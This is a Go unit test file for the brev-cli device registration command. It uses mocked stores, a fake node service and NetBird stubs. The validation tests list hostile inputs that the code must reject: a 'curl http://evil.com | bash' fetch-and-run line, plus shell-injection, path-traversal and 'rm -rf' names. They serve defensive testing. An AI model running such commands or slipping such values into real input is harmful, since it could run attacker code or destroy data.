package register

import (
	"context"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/terminal"
)

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	orgs  []entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetOrganizationsByName(name string) ([]entity.Organization, error) {
	var matched []entity.Organization
	for _, o := range m.orgs {
		if o.Name == name {
			matched = append(matched, o)
		}
	}
	return matched, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load() (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for registerDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }

// sshSkipConfirmer says yes to everything except the SSH access prompt.
type sshSkipConfirmer struct{}

func (sshSkipConfirmer) ConfirmYesNo(label string) bool {
	return !strings.Contains(label, "SSH")
}

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error       { return m.err }
func (m mockNetBirdManager) Uninstall() error     { return m.err }
func (m mockNetBirdManager) EnsureRunning() error { return m.err }

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testHardwareProfile returns a realistic HardwareProfile for use in tests.
func testHardwareProfile() *HardwareProfile {
	cpuCount := int32(2)
	ramBytes := int64(131886028) * 1024
	memBytes := int64(131072) * 1024 * 1024
	return &HardwareProfile{
		Architecture: "arm64",
		OS:           "Ubuntu",
		OSVersion:    "24.04",
		GPUs: []GPU{
			{Model: "NVIDIA GB10", Count: 1, MemoryBytes: &memBytes},
		},
		CPUCount: &cpuCount,
		RAMBytes: &ramBytes,
		Storage: []StorageDevice{
			{Name: "nvme0n1", StorageBytes: 500107862016, StorageType: "SSD"},
		},
	}
}

// testRegisterDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (registerDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return registerDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    sshSkipConfirmer{},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		hardwareProfiler: &mockHardwareProfiler{
			profile: testHardwareProfile(),
		},
		registrationStore: regStore,
	}, server
}

func Test_runRegister_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			if req.GetOrganizationId() != "org_123" {
				t.Errorf("unexpected org: %s", req.GetOrganizationId())
			}
			if req.GetName() != "my-spark" {
				t.Errorf("unexpected name: %s", req.GetName())
			}
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	// Verify registration was persisted
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if !exists {
		t.Fatal("expected registration to exist after successful register")
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %s", reg.ExternalNodeID)
	}
	if reg.DisplayName != "my-spark" {
		t.Errorf("expected display name 'my-spark', got %s", reg.DisplayName)
	}
	if reg.OrgID != "org_123" {
		t.Errorf("expected org org_123, got %s", reg.OrgID)
	}

	// Verify setup command was executed
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

func Test_runRegister_UserCancels(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	// sudo.Gate returns a wrapped error when the user declines
	if err == nil {
		t.Fatal("expected error when user declines sudo gate")
	}
	if !strings.Contains(err.Error(), "canceled by user") {
		t.Errorf("expected 'canceled by user' error, got: %v", err)
	}

	// Registration should not exist
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runRegister_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{
				reg: &DeviceRegistration{
					ExternalNodeID: "unode_existing",
					DisplayName:    "Existing",
					OrgID:          "org_123",
				},
			}

			store := &mockRegisterStore{
				user: &entity.User{ID: "user_1"},
				org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

				token: "tok",
			}

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			err := runRegister(context.Background(), term, store, "Existing", "", deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func Test_runRegister_NoOrganization(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  nil,

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err == nil {
		t.Fatal("expected error when no org exists")
	}
}

func Test_runRegister_WithOrgFlag(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs: []entity.Organization{
			{ID: "org_456", Name: "SpecificOrg"},
		},
		token: "tok",
	}

	var capturedOrgID string
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			capturedOrgID = req.GetOrganizationId()
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()
	deps.setupRunner = setupRunner

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "SpecificOrg", deps)
	if err != nil {
		t.Fatalf("runRegister with --org failed: %v", err)
	}

	if capturedOrgID != "org_456" {
		t.Errorf("expected org_456, got %s", capturedOrgID)
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.OrgID != "org_456" {
		t.Errorf("expected registration org org_456, got %s", reg.OrgID)
	}
}

func Test_runRegister_WithOrgFlag_NotFound(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs:  []entity.Organization{},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "NonexistentOrg", deps)
	if err == nil {
		t.Fatal("expected error when org not found")
	}
	if !strings.Contains(err.Error(), "no organization found") {
		t.Errorf("expected 'no organization found' error, got: %v", err)
	}
}

func Test_runRegister_AddNodeFails(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err == nil {
		t.Fatal("expected error when AddNode fails")
	}

	// Registration should not exist on failure
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after AddNode failure")
	}
}

func Test_runRegister_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

// NOTE: Test_runRegister_GrantSSH_retries_on_connection_error_then_succeeds
// and Test_runRegister_GrantSSH_no_retry_on_permanent_error were removed
// because they require an interactive terminal for PromptSSHPort. The retry
// logic in SetupAndRegisterNodeSSHAccess is tested independently.
// These will be restored once the prompting refactor lands.

func Test_runRegister_NameValidation(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantErr   bool
		errSubstr string
	}{
		{"Valid", "my-dgx-spark", false, ""},
		{"WithDots", "node.local.1", false, ""},
		{"WithUnderscore", "my_node", false, ""},
		{"Spaces", "My Spark", true, "letters, digits"},
		{"ShellInjection", "$(whoami)", true, "letters, digits"},
		{"PathTraversal", "../etc/passwd", true, "letters, digits"},
		{"Backticks", "`rm -rf`", true, "letters, digits"},
		{"Semicolon", "a;rm -rf /", true, "letters, digits"},
		{"LeadingHyphen", "-node", true, "start with"},
		{"LeadingDot", ".hidden", true, "start with"},
		{"TooLong", strings.Repeat("a", 64), true, "63 characters"},
		{"Empty", "", true, "name is required"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
				token: "tok",
			}

			svc := &fakeNodeService{
				addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return &nodev1.AddNodeResponse{
						ExternalNode: &nodev1.ExternalNode{
							ExternalNodeId: "unode_abc",
							OrganizationId: "org_123",
							Name:           req.GetName(),
							DeviceId:       req.GetDeviceId(),
						},
					}, nil
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			err := runRegister(context.Background(), term, store, tt.input, "", deps)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				if !strings.Contains(err.Error(), tt.errSubstr) {
					t.Errorf("expected error containing %q, got: %v", tt.errSubstr, err)
				}
			} else if err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func Test_runRegister_PlatformIncompatible(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.platform = mockPlatform{compatible: false}

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err == nil {
		t.Fatal("expected error when platform is incompatible")
	}
	if !strings.Contains(err.Error(), "only supported on Linux") {
		t.Errorf("expected platform incompatibility error, got: %v", err)
	}
}

func Test_runRegister_HardwareProfilerFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.hardwareProfiler = &mockHardwareProfiler{err: fmt.Errorf("nvml init failed")}

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err == nil {
		t.Fatal("expected error when hardware profiler fails")
	}
	if !strings.Contains(err.Error(), "hardware profile") {
		t.Errorf("expected hardware profile error, got: %v", err)
	}
}

func Test_runRegister_NetBirdInstallFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.netbird = mockNetBirdManager{err: fmt.Errorf("install failed")}

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "my-spark", "", deps)
	if err == nil {
		t.Fatal("expected error when NetBird install fails")
	}
	if !strings.Contains(err.Error(), "tunnel setup failed") {
		t.Errorf("expected tunnel setup error, got: %v", err)
	}
}

func Test_runRegister_NoNameNotRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "", "", deps)
	if err == nil {
		t.Fatal("expected error when no name provided and not registered")
	}
	if !strings.Contains(err.Error(), "name is required") {
		t.Errorf("expected 'name is required' error, got: %v", err)
	}
}

func Test_runRegister_NoNameAlreadyRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{
		reg: &DeviceRegistration{
			ExternalNodeID: "unode_existing",
			DisplayName:    "Existing Device",
			OrgID:          "org_123",
		},
	}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{
		getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
			return &nodev1.GetNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: req.GetExternalNodeId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
					},
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "", "", deps)
	if err != nil {
		t.Fatalf("expected nil error when already registered with no name, got: %v", err)
	}

	// Registration should still exist
	exists, _ := regStore.Exists()
	if !exists {
		t.Error("expected registration to still exist")
	}
}

// NOTE: Test_runRegister_OpenSSHPort was removed because it requires an
// interactive terminal for PromptSSHPort. OpenSSHPort is a thin RPC wrapper
// and can be tested directly. These will be restored once the prompting
// refactor lands.
